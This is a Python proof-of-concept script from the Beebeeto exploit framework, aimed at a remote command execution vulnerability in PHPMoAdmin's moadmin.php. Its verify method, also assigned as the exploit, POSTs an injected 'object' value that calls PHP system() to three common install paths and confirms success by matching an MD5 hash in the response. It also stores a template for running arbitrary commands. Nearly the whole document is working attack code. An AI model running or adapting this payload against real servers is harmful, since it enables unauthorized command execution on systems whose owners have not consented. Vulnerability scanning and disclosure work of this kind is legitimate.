#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0044',
            'name': 'PHPMoAdmin /moadmin.php 远程命令执行漏洞 (0-Day) POC',
            'author': 'foundu',
            'create_date': '2015-03-04',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPMoAdmin',
            'vul_version': ['*'],
            'type': 'Command Execution',
            'tag': ['PHPMoAdmin漏洞', 'PHPMoAdmin远程命令执行', '/moadmin.php', 'php'],
            'desc': 'PHPMoAdmin is a MongoDB administration tool for PHP built on a\
                     stripped-down version of the Vork high-performance framework.',
            'references': ['http://seclists.org/fulldisclosure/2015/Mar/19',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        file_path = ['/moadmin.php', '/moadmin/moadmin.php', '/wu-moadmin/wu-moadmin.php']
        for f in file_path:
            verify_url = args['options']['target'] + f
            command = {'object': '''1;system('echo -n "beebeeto"|md5sum;');exit''',}
            if args['options']['verbose']:
                print '[*] Request URL: ' + verify_url
            content = requests.post(verify_url, data=command).content
            if '595bb9ce8726b4b55f538d3ca0ddfd76' in content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
                args['poc_ret']['post_content'] = "object=1;system('command');exit"
                return args
            continue
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())